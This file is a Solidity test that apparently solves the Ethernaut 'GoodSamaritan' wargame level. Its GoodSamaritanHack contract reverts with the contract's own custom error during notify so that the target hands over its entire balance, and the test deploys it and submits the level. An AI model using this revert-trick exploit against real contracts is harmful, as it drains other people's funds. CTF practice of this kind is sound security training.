// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "levels/GoodSamaritan/GoodSamaritan.sol";
import "levels/GoodSamaritan/GoodSamaritanFactory.sol";
import "./utils/EthernautTest.sol";

interface IGoodSamaritan {
    function requestDonation() external returns (bool enoughBalance);
}

contract GoodSamaritanHack {
    error NotEnoughBalance();

    constructor(address _levelAddress) {
        GoodSamaritan level = GoodSamaritan(_levelAddress);
        level.requestDonation();
    }

    function notify(uint256 _amount) external pure {
        if (_amount <= 10) {
            revert NotEnoughBalance();
        }
    }
}

contract GoodSamaritanTest is Test {
    address levelAddress;
    EthernautTest ethernautTest;

    function setUp() public {
        ethernautTest = new EthernautTest();
        levelAddress = ethernautTest.setup(new GoodSamaritanFactory());
    }

    function test_goodsamaritan() external {
        // Exploit
        vm.startPrank(tx.origin);
        GoodSamaritanHack goodSamaritanHack = new GoodSamaritanHack(levelAddress);
        vm.stopPrank();

        // Submit
        ethernautTest.submit();
    }
}
